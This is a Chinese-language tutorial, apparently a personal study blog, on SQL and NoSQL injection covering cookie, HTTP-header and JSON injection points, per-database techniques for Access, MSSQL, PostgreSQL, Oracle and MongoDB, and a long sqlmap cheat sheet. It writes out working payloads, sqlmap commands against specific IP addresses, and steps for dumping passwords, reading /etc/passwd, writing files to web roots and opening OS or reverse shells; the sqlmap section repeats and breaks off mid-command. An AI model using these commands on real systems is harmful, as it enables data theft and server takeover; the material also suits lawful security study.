<h4 id="cookie注入"><a href="#cookie注入" class="headerlink" title="cookie注入"></a>cookie注入</h4><p>（sqlilabs less 20）</p>
<p>有时网站对get、post请求都进行了关键词过滤，难以注入，但是忽略了cookie也可以传递参数。如果cookie的参数也被用于SQL语句，那么也有成功注入的可能。有时使用cookie传参时会与post冲突，此时可能需要改为使用GET请求。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220727144345092.png" alt="image-20220727144345092"></p>
<h4 id="request请求注入"><a href="#request请求注入" class="headerlink" title="request请求注入"></a>request请求注入</h4><p>如果网站是request请求，那么可以在所有方法的位置提交，包括get、post、cookie。</p>
<p>下面的网站以get或post都能提交参数：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220727105414609.png" alt="image-20220727105414609"></p>
<h4 id="SERVER注入"><a href="#SERVER注入" class="headerlink" title="$_SERVER注入"></a>$_SERVER注入</h4><p>php内置函数，用于获取一些参数信息。</p>
<p>$_SERVER详解：<a target="_blank" rel="noopener" href="https://blog.csdn.net/lky_for_lucky/article/details/111300340">https://blog.csdn.net/lky_for_lucky/article/details/111300340</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$_SERVER[&#x27;HTTP_ACCEPT_LANGUAGE&#x27;] //浏览器语言</span><br><span class="line">$_SERVER[&#x27;REMOTE_ADDR&#x27;] //当前用户IP</span><br><span class="line">$_SERVER[&#x27;REMOTE_HOST&#x27;] //当前用户[主机名]</span><br></pre></td></tr></table></figure>

<p>如果通过$_SERVER获取的信息被用于SQL语句，那么就可能存在注入漏洞。</p>
<p>比如BP抓包后，将浏览器信息User-Agent进行修改。如果网站将User-Agent字段作为SQL语句的参数，那就可能存在注入成功的可能。</p>
<h4 id="json数据注入"><a href="#json数据注入" class="headerlink" title="json数据注入"></a>json数据注入</h4><p>原理一样与其他注入一样，只是注入点改为json的键值对中的值。</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/1624337757521-14b7e701-9024-4ef6-9696-83c7fcef0409.png" alt="image.png" style="zoom:67%;">

<h4 id="HTTP头部参数注入"><a href="#HTTP头部参数注入" class="headerlink" title="HTTP头部参数注入"></a>HTTP头部参数注入</h4><p>（sqlilabs less 18）</p>
<p>有些网站调用php的$_SERVER获取一些HTTP头部信息，比如User-Agent。这些地方可以进行注入。</p>
<p>还有X- Forwarded- For，简称XFF头，它代表客户端真实的IP。这里也可以尝试进行注入。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220727145345768.png" alt="image-20220727145345768"></p>
<p>上例中的SQL语句为insert操作，无法像select一样回显信息，因此只能盲注。</p>
<h2 id="8-各种数据库注入"><a href="#8-各种数据库注入" class="headerlink" title="8. 各种数据库注入"></a>8. 各种数据库注入</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42438245/article/details/121579063">https://blog.csdn.net/qq_42438245/article/details/121579063</a></p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220727150100470.png" alt="image-20220727150100470" style="zoom:50%;">

<p><strong>各种数据库的注入特点</strong></p>
<p>不同的数据库具有不同的注入特点，每个数据库支持的功能不一样，获取到的权限和可执行操作等不同。</p>
<p>包括access、mysql、mssql、mongoDB、postgresql、sqlite、oracle、sybase等。</p>
<h3 id="access注入（暴力）"><a href="#access注入（暴力）" class="headerlink" title="access注入（暴力）"></a>access注入（暴力）</h3><p>access数据库都是存放在网站目录下，后缀格式为 mdb，asp，asa，结构为表名&#x2F;列名&#x2F;数据，不同的网站会有各自的acess数据库。不会像mySQL那样一个网站的管理员可以操作多个mySQL数据库，导致存在跨库注入的情况。mySQL的结构为数据库名&#x2F;表名&#x2F;列名&#x2F;数据。</p>
<p>access没有information_ schema表，数据库名、操作系统等等都无法查询，<u>只能暴力猜解表名、列名、数据</u>，可以通过一些暴库手段、目录猜解等下载数据库。</p>
<ul>
<li><p>判断数据库类型</p>
<p>由于各个数据库特征不同，这里直接使用sqlmap比较方便：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220727152142889.png" alt="image-20220727152142889"></p>
</li>
<li><p>判断注入点</p>
</li>
<li><p>猜解字段数量</p>
<p>oder by</p>
</li>
<li><p>判断哪几个位置回显</p>
<p><code>?id=-1 union select 1,2,3</code></p>
</li>
<li><p>暴力猜解表名、列名等信息</p>
<p>比如猜当前表为admin，看是否成功返回数据：</p>
<p><code>?id=-1 union select 1,2,3 from admin</code></p>
</li>
</ul>
<p>使用工具进行暴力猜解：</p>
<p>尝试爆表名：<code>sqlmap -u http://219.153.49.228:46617/new_list.asp?id=1 --tables</code> </p>
<p>尝试爆表admin的列名： <code>sqlmap -u http://219.153.49.228:46617/new_list.asp?id=1 --dump -T &quot;admin&quot;</code></p>
<h3 id="msSQL注入（pangolin穿山甲）"><a href="#msSQL注入（pangolin穿山甲）" class="headerlink" title="msSQL注入（pangolin穿山甲）"></a>msSQL注入（pangolin穿山甲）</h3><ul>
<li><p>判断数据库类型</p>
<p>由于各个数据库特征不同，这里直接使用pangolin穿山甲工具进行判断：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220727153727547.png" alt="image-20220727153727547"></p>
<p>从工具中还可以看到不同数据库可以获得的权限，明显msSQL可以得到更多权限。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220727154114341.png" alt="image-20220727154114341"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220727154006163.png" alt="image-20220727154006163"></p>
<p>在信息一栏中可以查看到数据库的各种信息：版本、数据库名、计算机名、数据库名、管理员最高权限、Sql-server对应root （mysql）、数据库各表名、磁盘、用户组、用户等。</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220727154518550.png" alt="image-20220727154518550" style="zoom:50%;">

<p>在获取数据一栏中可以获取数据库信息，表名数据等</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220727154538662.png" alt="image-20220727154538662" style="zoom:50%;">
</li>
<li><p>msSQL的手工注入</p>
<p>语句会与mySQL不同：</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/wuhongbin/p/15582849.html">https://www.cnblogs.com/wuhongbin/p/15582849.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xishaonian/p/6173644.html">https://www.cnblogs.com/xishaonian/p/6173644.html</a></p>
</li>
</ul>
<h3 id="postgreSQL注入"><a href="#postgreSQL注入" class="headerlink" title="postgreSQL注入"></a>postgreSQL注入</h3><ul>
<li>可以使用工具：sqlmap、pangolin穿山甲</li>
</ul>
<p>识别数据库类型：<code>sqlmap -u http://219.153.49.228:44677/new_list.php?id=1</code></p>
<p>判断数据库权限：<code>sqlmap -u http://219.153.49.228:44677/new_list.php?id=1 -privileges --level 3</code></p>
<p>判断是否为数据库管理员：<code>sqlmap -u http://219.153.49.228:44677/new_list.php?id=1 --is-dba --level 3</code></p>
<p>查看当前数据库：<code>sqlmap -u http://219.153.49.228:44677/new_list.php?id=1 --current-db --batch</code></p>
<p>查看名为public的数据库的表名：<code>sqlmap -u http://219.153.49.228:44677/new_list.php?id=1 -D public --tables</code></p>
<p>查看表reg_users 的列名：<code>sqlmap -u http://219.153.49.228:44677/new_list.php?id=1 -D public -T reg_users --columns</code></p>
<p>查看表reg_users 的具体数据：<code>sqlmap -u http://219.153.49.228:44677/new_list.php?id=1 -D public -T reg_users -C &quot;name,password&quot; --dump --batch</code></p>
<ul>
<li><p>手工注入，某些语句会有差别：</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/hack8/article/details/6427911">https://blog.csdn.net/hack8/article/details/6427911</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/yilishazi/p/14710349.html">https://www.cnblogs.com/yilishazi/p/14710349.html</a></p>
</li>
</ul>
<h3 id="Oracle注入"><a href="#Oracle注入" class="headerlink" title="Oracle注入"></a>Oracle注入</h3><ul>
<li><p>使用工具：sqlmap、pangolin穿山甲</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220727162001437.png" alt="image-20220727162001437"></p>
</li>
<li><p>手工注入</p>
<p>参考文档：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/peterpan0707007/p/8242119.html">https://www.cnblogs.com/peterpan0707007/p/8242119.html</a></p>
</li>
</ul>
<h3 id="mongoDB注入"><a href="#mongoDB注入" class="headerlink" title="mongoDB注入"></a>mongoDB注入</h3><ul>
<li><p>使用工具</p>
<p>SQLmap不能识别MongoDB，这里介绍nosqlattack：<a target="_blank" rel="noopener" href="https://github.com/youngyangyang04/NoSQLAttack">https://github.com/youngyangyang04/NoSQLAttack</a></p>
<p>首先输入目标网站IP：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220727164245044.png" alt="image-20220727164245044"></p>
<p>然后输入路径：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220727164313282.png" alt="image-20220727164313282"></p>
<p>尝试攻击：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220727164346561.png" alt="image-20220727164346561"></p>
</li>
<li><p>手工注入</p>
<p>参考文档：</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_39936434/article/details/95319449">https://blog.csdn.net/qq_39936434/article/details/95319449</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/wefeng/p/11503102.html">https://www.cnblogs.com/wefeng/p/11503102.html</a></p>
<p>Mongodb的查询文档方式与其他的数据库略微不同，当进行条件查询的时候，mysql是用where, 而mongodb是以键值对形式进行查询的。</p>
<p>比如按id&#x3D;”1”查询表news中的数据：<code>select * from admin &#123;&#39;id&#39;: &#39;1&#39;&#125;)</code>。</p>
<ul>
<li><p>构建回显，mongoDB查询操作的源代码为findone({‘id’：‘1’})</p>
<p>攻击语句：<code>/new_list.php?id=1&#39;&#125;);return(&#123;title:1,content:&#39;2</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://i0.hdslb.com/bfs/article/4e7e306f459dea0d7e0f0f629cfc5164865c521c.png@831w_207h_progressive.webp" alt="img"></p>
</li>
<li><p>爆库</p>
<p><code>/new_list.php?id=1&#39;&#125;); return (&#123;title:tojson(db),content:&#39;1</code></p>
<p>—tojson() 方法可以将 Date 对象转换为字符串格式化为 JSON 数据格式，相当于MySQL的数据库名。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/58e82612a8625ea7cb239e0e56529d8b36c06def.png@831w_168h_progressive.webp" alt="img"></p>
</li>
<li><p>爆表</p>
<p><code>/new_list.php?id=1&#39;&#125;);return(&#123;title:tojson(db.getCollectionNames()),content:&#39;1</code> </p>
<p>db.getCollectionNames()返回的是数组，转化为json格式，相当于MySQL的tables。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/193beaae0edc48fde33c165acbb2ee1e430c4600.png@831w_210h_progressive.webp" alt="img"></p>
</li>
<li><p>查询指定数据</p>
<p><code>/new_list.php?id=1&#39;&#125;);return(&#123;title:tojson(db.Authority_confidential.find()[0]),content:&#39;1</code></p>
<p>元素集中查找使用E.find(expr)函数，用于从匹配的元素集E的子元素中找出与find指定表达式expr相匹配的元素集合，E 同 expr 可视作同父子元素关系.</p>
<p>find()[0]为第一条数据，find()[1]为第二条</p>
<p>由于是字典形式，所以键和值一起出来了，不需要额外查询列。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/7bd9545127c9714df2a53416d7caa935b305e196.png@831w_290h_progressive.webp" alt="img"></p>
</li>
</ul>
</li>
</ul>
<h2 id="9-sqlmap"><a href="#9-sqlmap" class="headerlink" title="9. sqlmap"></a>9. sqlmap</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">-u  #注入点 </span><br><span class="line">-f  #指纹判别数据库类型 </span><br><span class="line">-b  #获取数据库版本信息 </span><br><span class="line">-p  #指定可测试的参数(?page=1&amp;id=2 -p &quot;page,id&quot;) </span><br><span class="line">-D &quot;&quot;  #指定数据库名 </span><br><span class="line">-T &quot;&quot;  #指定表名 </span><br><span class="line">-C &quot;&quot;  #指定字段 </span><br><span class="line">-s &quot;&quot;  #保存注入过程到一个文件,还可中断，下次恢复在注入(保存：-s &quot;xx.log&quot;　　恢复:-s &quot;xx.log&quot; --resume) </span><br><span class="line">--level=(1-5) #要执行的测试水平等级，默认为1 </span><br><span class="line">--risk=(0-3)  #测试执行的风险等级，默认为1 </span><br><span class="line">--time-sec=(2,5) #延迟响应，默认为5 </span><br><span class="line">--data #通过POST发送数据 </span><br><span class="line">--columns        #列出字段 </span><br><span class="line">--current-user   #获取当前用户名称 </span><br><span class="line">--current-db     #获取当前数据库名称 </span><br><span class="line">--users          #列数据库所有用户 </span><br><span class="line">--passwords      #数据库用户所有密码 </span><br><span class="line">--privileges     #查看用户权限(--privileges -U root) </span><br><span class="line">-U               #指定数据库用户 </span><br><span class="line">--dbs            #列出所有数据库 </span><br><span class="line">--tables -D &quot;&quot;   #列出指定数据库中的表 </span><br><span class="line">--columns -T &quot;user&quot; -D &quot;mysql&quot;#列出mysql数据库中的user表的所有字段</span><br><span class="line">--dump-all            #列出所有数据库所有表 </span><br><span class="line">--exclude-sysdbs      #只列出用户自己新建的数据库和表 </span><br><span class="line">--dump -T &quot;&quot; -D &quot;&quot; -C &quot;&quot;   #列出指定数据库的表的字段的数据(--dump -T users -D master -C surname) </span><br><span class="line">--dump -T &quot;&quot; -D &quot;&quot; --start 2 --top 4  # 列出指定数据库的表的2-4字段的数据 </span><br><span class="line">--dbms    #指定数据库类型(MySQL,Oracle,PostgreSQL,Microsoft SQL Server,Microsoft Access,SQLite,Firebird,Sybase,SAP MaxDB) </span><br><span class="line">--os      #指定系统(Linux,Windows) </span><br><span class="line">-v  #详细的等级(0-6)     0：只显示Python的回溯，错误和关键消息。 </span><br><span class="line">    1：显示信息和警告消息。 </span><br><span class="line">    2：显示调试消息。 </span><br><span class="line">    3：有效载荷注入。 </span><br><span class="line">    4：显示HTTP请求。 </span><br><span class="line">    5：显示HTTP响应头。 </span><br><span class="line">    6：显示HTTP响应页面的内容 </span><br><span class="line">--privileges  #查看权限 </span><br><span class="line">--is-dba      #是否是数据库管理员 </span><br><span class="line">--roles       #枚举数据库用户角色 </span><br><span class="line">--udf-inject  #导入用户自定义函数（获取系统权限） </span><br><span class="line">--union-check  #是否支持union 注入 </span><br><span class="line">--union-cols #union 查询表记录 </span><br><span class="line">--union-test #union 语句测试 </span><br><span class="line">--union-use  #采用union 注入 </span><br><span class="line">--union-tech orderby #union配合order by </span><br><span class="line">--data &quot;&quot; #POST方式提交数据(--data &quot;page=1&amp;id=2&quot;) </span><br><span class="line">--cookie &quot;用;号分开&quot;      #cookie注入(--cookies=”PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low”) --referer &quot;&quot;     #使用referer欺骗(--referer &quot;http://&quot;) </span><br><span class="line">--user-agent &quot;&quot;  #自定义user-agent </span><br><span class="line">--proxy &quot;http://127.0.0.1:8118&quot; #代理注入 </span><br><span class="line">--string=&quot;&quot;    #指定关键词,字符串匹配. </span><br><span class="line">--threads 　　  #采用多线程(--threads 3) </span><br><span class="line">--sql-shell    #执行指定sql命令 </span><br><span class="line">--sql-query    #执行指定的sql语句(--sql-query &quot;SELECT password FROM mysql.user WHERE user = &#x27;root&#x27; LIMIT 0, 1&quot; ) </span><br><span class="line">--file-read    #读取指定文件 </span><br><span class="line">--file-write   #写入本地文件(--file-write /test/test.txt --file-dest /var/www/html/1.txt;将本地的test.txt文件写入到目标的1.txt) </span><br><span class="line">--file-dest    #要写入的文件绝对路径 </span><br><span class="line">--os-cmd=id    #执行系统命令 </span><br><span class="line">--os-shell     #系统交互shell </span><br><span class="line">--os-pwn       #反弹shell(--os-pwn --msf-path=/opt/framework/msf3/) </span><br><span class="line">--msf-path=    #matesploit绝对路径(--msf-path=/opt/framework/msf3/) </span><br><span class="line">--os-smbrelay  # </span><br><span class="line">--os-bof       # </span><br><span class="line">--reg-read     #读取win系统注册表 </span><br><span class="line">--priv-esc     # </span><br><span class="line">--time-sec=    #延迟设置 默认--time-sec=5 为5秒 -p &quot;user-agent&quot; --user-agent &quot;sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)&quot;  #指定user-agent注入 </span><br><span class="line">--eta          #盲注 /pentest/database/sqlmap/txt/common-columns.txt　　字段字典　　　 </span><br><span class="line">common-outputs.txt </span><br><span class="line">common-tables.txt      表字典 </span><br><span class="line">keywords.txt </span><br><span class="line">oracle-default-passwords.txt </span><br><span class="line">user-agents.txt </span><br><span class="line">wordlist.txt </span><br><span class="line"></span><br><span class="line">常用语句 :</span><br><span class="line">1./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -f -b --current-user --current-db --users --passwords --dbs -v 0 </span><br><span class="line">2./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --passwords -U root --union-use -v 2 </span><br><span class="line">3./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --dump -T users -C username -D userdb --start 2 --stop 3 -v 2 </span><br><span class="line">4./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --dump -C &quot;user,pass&quot;  -v 1 --exclude-sysdbs </span><br><span class="line">5./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --sql-shell -v 2 </span><br><span class="line">6./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --file-read &quot;c:\boot.ini&quot; -v 2 </span><br><span class="line">7./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --file-write /test/test.txt --file-dest /var/www/html/1.txt -v 2 </span><br><span class="line">8./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-cmd &quot;id&quot; -v 1 </span><br><span class="line">9./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-shell --union-use -v 2 </span><br><span class="line">10./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-pwn --msf-path=/opt/framework/msf3 --priv-esc -v 1 </span><br><span class="line">11./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-pwn --msf-path=/opt/framework/msf3 -v 1 </span><br><span class="line">12./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-bof --msf-path=/opt/framework/msf3 -v 1 </span><br><span class="line">13./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 --reg-add --reg-key=&quot;HKEY_LOCAL_NACHINE\SOFEWARE\sqlmap&quot; --reg-value=Test --reg-type=REG_SZ --reg-data=1 </span><br><span class="line">14./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --eta </span><br><span class="line">15./sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1&quot; -p id --prefix &quot;&#x27;)&quot; --suffix &quot;AND (&#x27;abc&#x27;=&#x27;abc&quot;16./sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mysql/basic/get_int.php?id=1&quot; --auth-type Basic --auth-cred &quot;testuser:testpass&quot;17./sqlmap.py -l burp.log --scope=&quot;(www)?\.target\.(com|net|org)&quot;18./sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mysql/get_int.php?id=1&quot; --tamper tamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v 3 </span><br><span class="line">19./sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mssql/get_int.php?id=1&quot; --sql-query &quot;SELECT &#x27;foo&#x27;&quot; -v 1 </span><br><span class="line">20./sqlmap.py -u &quot;http://192.168.136.129/mysql/get_int_4.php?id=1&quot; --common-tables -D testdb --banner </span><br><span class="line">21./sqlmap.py -u &quot;http://192.168.136.129/mysql/get_int_4.php?id=1&quot; --cookie=&quot;PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low&quot; --string=&#x27;xx&#x27; --dbs --level=3 -p &quot;uid&quot;</span><br></pre></td></tr></table></figure>

<p>简单的注入流程：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">1.读取数据库版本，当前用户，当前数据库 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 -f -b --current-user --current-db -v 1 </span><br><span class="line">2.判断当前数据库用户权限 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --privileges -U 用户名 -v 1 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --is-dba -U 用户名 -v 1 </span><br><span class="line">3.读取所有数据库用户或指定数据库用户的密码 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --users --passwords -v 2 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --passwords -U root -v 2 </span><br><span class="line">4.获取所有数据库 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --dbs -v 2 </span><br><span class="line">5.获取指定数据库中的所有表 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --tables -D mysql -v 2 </span><br><span class="line">6.获取指定数据库名中指定表的字段 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --columns -D mysql -T users -v 2 </span><br><span class="line">7.获取指定数据库名中指定表中指定字段的数据 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --dump -D mysql -T users -C &quot;username,password&quot; -s &quot;sqlnmapdb.log&quot; -v 2 </span><br><span class="line">8.file-read读取web文件 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --file-read &quot;/etc/passwd&quot; -v 2 </span><br><span class="line">9.file-write写入文件到web </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --file-write /localhost/mm.php --file使用sqlmap绕过防火墙进行注入测试：简单的注入流程 :</span><br><span class="line">1.读取数据库版本，当前用户，当前数据库 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 -f -b --current-user --current-db -v 1 </span><br><span class="line">2.判断当前数据库用户权限 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --privileges -U 用户名 -v 1 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --is-dba -U 用户名 -v 1 </span><br><span class="line">3.读取所有数据库用户或指定数据库用户的密码 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --users --passwords -v 2 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --passwords -U root -v 2 </span><br><span class="line">4.获取所有数据库 </span><br><span class="line">sqlmap -u http://www.xxxxx.com/test.php?p=2 --dbs -v 2 </span><br><span 